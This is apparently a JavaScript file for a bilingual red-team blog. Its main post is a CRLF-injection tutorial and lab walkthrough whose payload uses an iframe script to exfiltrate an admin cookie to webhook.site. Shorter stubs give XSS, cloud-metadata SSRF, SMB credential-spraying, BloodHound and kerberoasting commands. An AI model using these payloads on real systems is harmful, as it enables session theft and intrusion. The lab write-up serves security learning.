const translations = {
  en: {
    site_title: "Red Team Notes",
    intro_1: "Cybersecurity practitioner focused on offensive security.",
    intro_2: "Specialized in vulnerability research, exploit development, and real-world attack simulation. Experienced in web exploitation, Active Directory attacks, and red teaming methodologies.",
    intro_3: "This platform serves as a personal knowledge base documenting attack techniques, lab reproductions, and security insights.",
    tag_web: "Web Security",
    tag_pentest: "Penetration Testing",
    tag_ad: "Active Directory",
    tag_redteam: "Red Teaming",
    tag_exploit: "Exploit Development",
    tag_network: "Network Security",
    tag_python: "Python",
    tag_linux: "Linux",
    tag_ctf: "CTF",
    github_link: "GitHub / Pariston-Hill",
    nav_blog: "Blog",
    nav_web: "Web Security",
    nav_pentest: "Penetration Testing",
    nav_ad: "Active Directory",
    home_title: "Recent Blogs",
    home_desc: "Latest research notes, attack chain walkthroughs, and lab reproductions.",
    web_title: "Web Security",
    web_desc: "Offensive testing, vulnerability validation, and exploit logic for web targets.",
    pentest_title: "Penetration Testing",
    pentest_desc: "Real-world assessment flow, pivoting techniques, and operator methodology.",
    ad_title: "Active Directory",
    ad_desc: "AD attack paths, escalation opportunities, and domain operation notes.",
    post_not_found: "Post Not Found",
    invalid_post: "Invalid post id",
    post_hint: "Use links from the home/category pages to open a valid post.",
    no_code: "No code snippet available."
  },
  zh: {
    site_title: "红队技术档案",
    intro_1: "专注于攻防对抗与渗透实践的网络安全从业者。",
    intro_2: "主要方向包括漏洞研究、利用开发与真实场景攻击模拟，覆盖 Web 利用、AD 攻击与红队方法论。",
    intro_3: "这里是个人知识库，用于记录攻击技术、实验复现与安全洞察。",
    tag_web: "Web 安全",
    tag_pentest: "渗透测试",
    tag_ad: "活动目录",
    tag_redteam: "红队对抗",
    tag_exploit: "漏洞利用开发",
    tag_network: "网络安全",
    tag_python: "Python",
    tag_linux: "Linux",
    tag_ctf: "CTF",
    github_link: "GitHub / Pariston-Hill",
    nav_blog: "博客",
    nav_web: "Web 安全",
    nav_pentest: "渗透测试",
    nav_ad: "活动目录",
    home_title: "最近博客",
    home_desc: "最新研究笔记、攻击链复盘与实验环境复现记录。",
    web_title: "Web 安全",
    web_desc: "围绕 Web 目标的攻防测试、漏洞验证与利用逻辑分析。",
    pentest_title: "渗透测试",
    pentest_desc: "真实项目中的评估流程、横向移动与操作方法论。",
    ad_title: "活动目录",
    ad_desc: "AD 攻击路径、提权机会与域环境实战笔记。",
    post_not_found: "未找到文章",
    invalid_post: "文章参数无效",
    post_hint: "请从首页或分类页点击有效文章链接访问。",
    no_code: "暂无代码片段。"
  }
};

const posts = [
  {
    id: "crlf-injection",
    href: "posts/web/crlf-injection.html",
    title: {
      en: "CRLF Injection",
      zh: "CRLF 注入"
    },
    category: "web",
    categoryLabel: { en: "Web", zh: "Web" },
    description: {
      en: "CRLF injection basics, attack surfaces, bypass techniques, and a practical lab walkthrough.",
      zh: "CRLF 注入基础、常见攻击面、绕过方式与一篇带截图的实战记录。"
    },
    date: "2026-04-24",
    content: {
      en: "A full note covering the nature of CRLF injection, common abuse patterns, and a practical cookie exfiltration walkthrough.",
      zh: "完整梳理 CRLF 注入的本质、常见利用方式，以及一次获取管理员 Cookie 的实战过程。"
    },
    code: "%0D%0A%0D%0A",
    contentHtml: {
      en: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
<ul>
  <li><code>\r</code>：回车（Carriage Return）</li>
  <li><code>\n</code>：换行（Line Feed）</li>
</ul>
<p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
<ul>
  <li>分隔 Header 与 Header</li>
  <li>分隔 Header 与 Body</li>
</ul>
<blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
<hr />
<h3>CRLF 注入的本质</h3>
<p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
<p>换句话说：</p>
<ul>
  <li>正常输入：被当成数据</li>
  <li>注入 CRLF：被当成协议</li>
</ul>
<p>这就是漏洞成立的核心。</p>
<hr />
<h3>一个基础模型</h3>
<p>假设服务器有如下逻辑：</p>
<pre><code>Location: /search?q=用户输入</code></pre>
<p>如果用户输入：</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>服务器响应变成：</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>这里发生的事情是：</p>
<ul>
  <li>原本只是参数</li>
  <li>被提升为新的 Header</li>
</ul>
<p>这就是典型的 CRLF 注入。</p>
<hr />
<h3>漏洞形成条件</h3>
<ol>
  <li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
  <li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
  <li>后端直接拼接字符串</li>
</ol>
<blockquote>用户输入被“直接拼进协议结构”。</blockquote>
<hr />
<h3>常见攻击类型</h3>
<h4>Header Injection</h4>
<p>攻击者插入新的 Header，例如：</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>效果包括：</p>
<ul>
  <li>注入 Cookie</li>
  <li>劫持会话</li>
  <li>控制重定向行为</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>通过插入如下内容：</p>
<pre><code>\r\n\r\n</code></pre>
<p>强行结束当前响应，开始一个新的响应：</p>
<pre><code>正常响应
\r\n\r\n
伪造响应</code></pre>
<p>攻击者可以：</p>
<ul>
  <li>注入 HTML 页面</li>
  <li>构造 XSS</li>
  <li>返回恶意内容</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>利用 CRLF 注入修改缓存内容</li>
  <li>污染 CDN 或代理缓存</li>
  <li>让其他用户访问恶意页面</li>
  <li>实现持久攻击</li>
</ul>
<h4>Request Smuggling（高阶利用）</h4>
<p>CRLF 可以作为基础构造：</p>
<ul>
  <li>插入额外请求</li>
  <li>干扰前后端解析</li>
  <li>操控请求队列</li>
</ul>
<p>这类攻击通常结合：</p>
<ul>
  <li>HTTP/1.1 与 HTTP/2 差异</li>
  <li>Front-end / Back-end 不一致解析</li>
</ul>
<hr />
<h3>常见注入位置</h3>
<p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
<ul>
  <li>URL 参数（GET）</li>
  <li>POST 参数</li>
  <li>HTTP Header（如 Referer / User-Agent）</li>
  <li>重定向参数（Location）</li>
  <li>日志系统（Log Injection）</li>
</ul>
<hr />
<h3>编码与绕过</h3>
<p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
<h4>URL 编码</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>双重编码</h4>
<pre><code>%250d%250a</code></pre>
<h4>变体利用</h4>
<ul>
  <li>只使用 LF（部分系统只过滤 CR）</li>
  <li>利用解析差异（前后端不同处理）</li>
  <li>HTTP/2 特殊 header 构造</li>
</ul>
<hr />
<h3>与 XSS / CSRF 的关系</h3>
<p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
<p>它可以作为：</p>
<ul>
  <li>XSS 的触发器（注入 HTML / JS）</li>
  <li>CSRF 的辅助（控制 Header / Cookie）</li>
  <li>Smuggling 的基础</li>
</ul>
<blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
<hr />
<h3>攻击链视角</h3>
<p>完整攻击链通常是：</p>
<pre><code>CRLF 注入
→ 控制 HTTP 结构
→ 插入恶意 Header / Response
→ 触发缓存 / 浏览器 / 后端逻辑
→ 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
<hr />
<h3>实战表现</h3>
<p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="CRLF 注入靶场首页" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="进入 report 页面后的界面" />
<p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite 拦截到的请求" />
<p>页面只返回 <code>reported</code>，没有特别的内容。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="reported 响应页面" />
<p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
<ul>
  <li>结束当前 header 行</li>
  <li>再制造一个空行</li>
  <li>强行结束响应头</li>
  <li>让后续可控内容进入 response body</li>
  <li>让浏览器把后续内容当作 HTML 渲染</li>
  <li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
  <li>脚本执行后再请求 webhook</li>
</ul>
<p>其次是 <code>content</code> 中的内容：</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>因为之前在 <code>name</code> 中提前结束了响应头，在目标服务器那边，<code>name</code> 被放进了 header 部分，所以我们可以利用匹配的方式来获取 Cookie。</p>
<p>将代码缩短为一行：</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>再将关键字进行 URL 编码：</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="编码后的最终 payload" />
<p>在 Webhook 成功收到请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook 收到带有 flag 的请求" />`,
      zh: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
<ul>
  <li><code>\r</code>：回车（Carriage Return）</li>
  <li><code>\n</code>：换行（Line Feed）</li>
</ul>
<p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
<ul>
  <li>分隔 Header 与 Header</li>
  <li>分隔 Header 与 Body</li>
</ul>
<blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
<hr />
<h3>CRLF 注入的本质</h3>
<p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
<p>换句话说：</p>
<ul>
  <li>正常输入：被当成数据</li>
  <li>注入 CRLF：被当成协议</li>
</ul>
<p>这就是漏洞成立的核心。</p>
<hr />
<h3>一个基础模型</h3>
<p>假设服务器有如下逻辑：</p>
<pre><code>Location: /search?q=用户输入</code></pre>
<p>如果用户输入：</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>服务器响应变成：</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>这里发生的事情是：</p>
<ul>
  <li>原本只是参数</li>
  <li>被提升为新的 Header</li>
</ul>
<p>这就是典型的 CRLF 注入。</p>
<hr />
<h3>漏洞形成条件</h3>
<ol>
  <li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
  <li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
  <li>后端直接拼接字符串</li>
</ol>
<blockquote>用户输入被“直接拼进协议结构”。</blockquote>
<hr />
<h3>常见攻击类型</h3>
<h4>Header Injection</h4>
<p>攻击者插入新的 Header，例如：</p>
<ul>
  <li>Set-Cookie</li>
  <li>Location</li>
  <li>Content-Type</li>
</ul>
<p>效果包括：</p>
<ul>
  <li>注入 Cookie</li>
  <li>劫持会话</li>
  <li>控制重定向行为</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>通过插入如下内容：</p>
<pre><code>\r\n\r\n</code></pre>
<p>强行结束当前响应，开始一个新的响应：</p>
<pre><code>正常响应
\r\n\r\n
伪造响应</code></pre>
<p>攻击者可以：</p>
<ul>
  <li>注入 HTML 页面</li>
  <li>构造 XSS</li>
  <li>返回恶意内容</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
  <li>利用 CRLF 注入修改缓存内容</li>
  <li>污染 CDN 或代理缓存</li>
  <li>让其他用户访问恶意页面</li>
  <li>实现持久攻击</li>
</ul>
<h4>Request Smuggling（高阶利用）</h4>
<p>CRLF 可以作为基础构造：</p>
<ul>
  <li>插入额外请求</li>
  <li>干扰前后端解析</li>
  <li>操控请求队列</li>
</ul>
<p>这类攻击通常结合：</p>
<ul>
  <li>HTTP/1.1 与 HTTP/2 差异</li>
  <li>Front-end / Back-end 不一致解析</li>
</ul>
<hr />
<h3>常见注入位置</h3>
<p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
<ul>
  <li>URL 参数（GET）</li>
  <li>POST 参数</li>
  <li>HTTP Header（如 Referer / User-Agent）</li>
  <li>重定向参数（Location）</li>
  <li>日志系统（Log Injection）</li>
</ul>
<hr />
<h3>编码与绕过</h3>
<p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
<h4>URL 编码</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>双重编码</h4>
<pre><code>%250d%250a</code></pre>
<h4>变体利用</h4>
<ul>
  <li>只使用 LF（部分系统只过滤 CR）</li>
  <li>利用解析差异（前后端不同处理）</li>
  <li>HTTP/2 特殊 header 构造</li>
</ul>
<hr />
<h3>与 XSS / CSRF 的关系</h3>
<p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
<p>它可以作为：</p>
<ul>
  <li>XSS 的触发器（注入 HTML / JS）</li>
  <li>CSRF 的辅助（控制 Header / Cookie）</li>
  <li>Smuggling 的基础</li>
</ul>
<blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
<hr />
<h3>攻击链视角</h3>
<p>完整攻击链通常是：</p>
<pre><code>CRLF 注入
→ 控制 HTTP 结构
→ 插入恶意 Header / Response
→ 触发缓存 / 浏览器 / 后端逻辑
→ 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
<hr />
<h3>实战表现</h3>
<p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235305.png" alt="CRLF 注入靶场首页" />
<img src="assets/posts/crlf-injection/Pasted image 20260423220226.png" alt="进入 report 页面后的界面" />
<p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423220515.png" alt="Burp Suite 拦截到的请求" />
<p>页面只返回 <code>reported</code>，没有特别的内容。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235353.png" alt="reported 响应页面" />
<p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
<ul>
  <li>结束当前 header 行</li>
  <li>再制造一个空行</li>
  <li>强行结束响应头</li>
  <li>让后续可控内容进入 response body</li>
  <li>让浏览器把后续内容当作 HTML 渲染</li>
  <li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
  <li>脚本执行后再请求 webhook</li>
</ul>
<p>其次是 <code>content</code> 中的内容：</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>因为之前在 <code>name</code> 中提前结束了响应头，在目标服务器那边，<code>name</code> 被放进了 header 部分，所以我们可以利用匹配的方式来获取 Cookie。</p>
<p>将代码缩短为一行：</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>再将关键字进行 URL 编码：</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img src="assets/posts/crlf-injection/Pasted image 20260423235453.png" alt="编码后的最终 payload" />
<p>在 Webhook 成功收到请求。</p>
<img src="assets/posts/crlf-injection/Pasted image 20260423235547.png" alt="Webhook 收到带有 flag 的请求" />`
    }
  },
  {
    id: "advanced-xss-chain",
    title: {
      en: "Advanced XSS Chain in Legacy Panel",
      zh: "旧版管理面板中的高级 XSS 利用链"
    },
    category: "web",
    categoryLabel: { en: "Web", zh: "Web" },
    description: {
      en: "Bypass-based XSS exploitation path in a legacy admin interface with payload hardening notes.",
      zh: "记录旧版后台中的 XSS 绕过利用路径与 payload 加固思路。"
    },
    date: "2026-04-20",
    content: {
      en: "Stored XSS was discovered in a markdown rendering endpoint with weak filtering. The chain combined content smuggling and event-handler execution.",
      zh: "在 Markdown 渲染接口中发现存储型 XSS。由于过滤薄弱，可结合内容走私与事件处理器触发形成稳定利用链。"
    },
    code: "payload=<img src=x onerror=alert(document.domain)>"
  },
  {
    id: "blind-ssrf-mapping",
    title: {
      en: "Blind SSRF to Internal Service Mapping",
      zh: "利用盲 SSRF 进行内网服务测绘"
    },
    category: "web",
    categoryLabel: { en: "Web", zh: "Web" },
    description: {
      en: "Using callback telemetry and protocol confusion to map internal services from a blind SSRF primitive.",
      zh: "通过回连信号与协议混淆，在盲 SSRF 条件下推断内网服务分布。"
    },
    date: "2026-04-17",
    content: {
      en: "Blind SSRF behavior was validated through out-of-band callbacks. Internal metadata and service ports were inferred using timing and response size differences.",
      zh: "使用带外回连验证盲 SSRF，并结合时延与响应长度差异推断元数据接口和服务端口。"
    },
    code: "curl -X POST /api/fetch -d \"url=http://169.254.169.254/latest/meta-data/\""
  },
  {
    id: "external-initial-access",
    title: {
      en: "External Pentest: Initial Access Playbook",
      zh: "外网渗透：初始突破作战手册"
    },
    category: "pentest",
    categoryLabel: { en: "Pentest", zh: "渗透" },
    description: {
      en: "Structured reconnaissance and first foothold strategy for external attack surface assessments.",
      zh: "面向外网攻击面的结构化侦察与初始落点获取策略。"
    },
    date: "2026-04-18",
    content: {
      en: "This workflow prioritizes attack surface triage, service fingerprinting, and exploitability scoring before validation.",
      zh: "该流程优先完成攻击面分级、服务指纹识别与可利用性评分，再进入验证阶段。"
    },
    code: "nmap -sC -sV -Pn target.tld"
  },
  {
    id: "internal-pivoting",
    title: {
      en: "Internal Pivoting via Misconfigured Services",
      zh: "通过错误配置服务进行内网横向"
    },
    category: "pentest",
    categoryLabel: { en: "Pentest", zh: "渗透" },
    description: {
      en: "Credential collection, service abuse, and pivot chain design in segmented enterprise environments.",
      zh: "在分段企业网络中，通过凭据收集、服务滥用与链路设计实现横向推进。"
    },
    date: "2026-04-15",
    content: {
      en: "After initial foothold, weak service ACL and credential reuse enabled movement across segmented hosts.",
      zh: "建立初始据点后，利用弱 ACL 与凭据复用在分段主机间完成横向移动。"
    },
    code: "proxychains crackmapexec smb 10.10.0.0/24 -u user -p pass"
  },
  {
    id: "ad-acl-abuse",
    title: {
      en: "AD ACL Abuse for Privilege Escalation",
      zh: "利用 AD ACL 误配实现提权"
    },
    category: "ad",
    categoryLabel: { en: "AD", zh: "AD" },
    description: {
      en: "From delegated rights abuse to high-privilege takeover with operational detection considerations.",
      zh: "从委派权限滥用到高权限接管，并分析过程中可被检测的关键行为。"
    },
    date: "2026-04-19",
    content: {
      en: "Misdelegated ACL permissions enabled controlled object takeover and privilege escalation in domain context.",
      zh: "错误委派的 ACL 权限导致对象可控接管，最终在域环境内完成提权。"
    },
    code: "bloodhound-python -u user -p pass -d corp.local -ns 10.10.0.10 -c all"
  },
  {
    id: "kerberoasting-opsec",
    title: {
      en: "Kerberoasting Workflow and OPSEC Notes",
      zh: "Kerberoasting 流程与 OPSEC 记录"
    },
    category: "ad",
    categoryLabel: { en: "AD", zh: "AD" },
    description: {
      en: "A practical kerberoasting process with account targeting priorities and noise reduction tactics.",
      zh: "实战化 Kerberoasting 流程，包含目标账户优先级与降噪策略。"
    },
    date: "2026-04-14",
    content: {
      en: "This note captures target prioritization and ticket-request strategy for controlled kerberoasting engagements.",
      zh: "本文记录受控演练中的目标优选与票据请求策略。"
    },
    code: "GetUserSPNs.py corp.local/user:pass -request -dc-ip 10.10.0.10"
  }
];

function getLanguage() {
  return localStorage.getItem("lang") || "en";
}

function setLanguage(lang) {
  localStorage.setItem("lang", lang);
  document.documentElement.lang = lang === "zh" ? "zh-CN" : "en";
}

function t(key, lang) {
  return (translations[lang] && translations[lang][key]) || key;
}

function applyStaticTranslations(lang) {
  document.querySelectorAll("[data-i18n]").forEach((el) => {
    const key = el.dataset.i18n;
    el.textContent = t(key, lang);
  });
}

function setupLanguageToggle(currentLang, page) {
  const btn = document.getElementById("lang-toggle");
  if (!btn) return;
  btn.textContent = currentLang === "en" ? "中文" : "EN";
  btn.addEventListener("click", () => {
    const next = getLanguage() === "en" ? "zh" : "en";
    setLanguage(next);
    applyStaticTranslations(next);
    if (page === "post") {
      renderSinglePost(next);
    } else {
      renderCards(page, next);
    }
    btn.textContent = next === "en" ? "中文" : "EN";
  });
}

function setActiveNav(page) {
  const navMap = { home: "blog", web: "web", pentest: "pentest", ad: "ad" };
  const activeKey = navMap[page];
  document.querySelectorAll(".top-nav a").forEach((item) => {
    if (item.dataset.nav === activeKey) {
      item.classList.add("active");
    } else {
      item.classList.remove("active");
    }
  });
}

function renderCards(page, lang) {
  const grid = document.getElementById("post-grid");
  if (!grid) return;

  let list = [...posts].sort((a, b) => new Date(b.date) - new Date(a.date));
  if (page === "web" || page === "pentest" || page === "ad") {
    list = list.filter((p) => p.category === page);
  }
  if (page === "home") {
    list = list.slice(0, 6);
  }

  grid.innerHTML = list.map((post) => `
    <article class="post-card">
      <span class="badge">${post.categoryLabel[lang]}</span>
      <h3><a href="${post.href || `post.html?id=${encodeURIComponent(post.id)}`}">${post.title[lang]}</a></h3>
      <p class="post-meta">${post.date}</p>
      <p class="post-desc">${post.description[lang]}</p>
    </article>
  `).join("");
}

function renderSinglePost(lang) {
  const params = new URLSearchParams(window.location.search);
  const postId = params.get("id");
  const post = posts.find((item) => item.id === postId);
  const titleEl = document.getElementById("post-title");
  const metaEl = document.getElementById("post-meta");
  const bodyEl = document.getElementById("post-body");
  if (!titleEl || !metaEl || !bodyEl) return;

  if (!post) {
    titleEl.textContent = t("post_not_found", lang);
    metaEl.textContent = t("invalid_post", lang);
    bodyEl.innerHTML = `<p id="post-desc"></p><pre id="post-code-block"><code id="post-code"></code></pre>`;
    document.getElementById("post-desc").textContent = t("post_hint", lang);
    document.getElementById("post-code").textContent = t("no_code", lang);
    document.getElementById("post-code-block").hidden = false;
    document.title = `${t("post_not_found", lang)} - Red Team Notes`;
    return;
  }

  titleEl.textContent = post.title[lang];
  metaEl.textContent = `Category: ${post.categoryLabel[lang]} | Date: ${post.date}`;
  document.title = `${post.title[lang]} - Red Team Notes`;

  if (post.contentHtml && post.contentHtml[lang]) {
    bodyEl.innerHTML = post.contentHtml[lang];
  } else {
    bodyEl.innerHTML = `<p id="post-desc"></p><pre id="post-code-block"><code id="post-code"></code></pre>`;
    document.getElementById("post-desc").textContent = post.content[lang];
    document.getElementById("post-code").textContent = post.code || t("no_code", lang);
    document.getElementById("post-code-block").hidden = !post.code;
  }
  setActiveNav(post.category);
}

(function init() {
  const page = document.body.dataset.page || "home";
  const lang = getLanguage();
  setLanguage(lang);
  applyStaticTranslations(lang);
  setupLanguageToggle(lang, page);
  if (page === "post") {
    renderSinglePost(lang);
    return;
  }
  setActiveNav(page);
  renderCards(page, lang);
})();
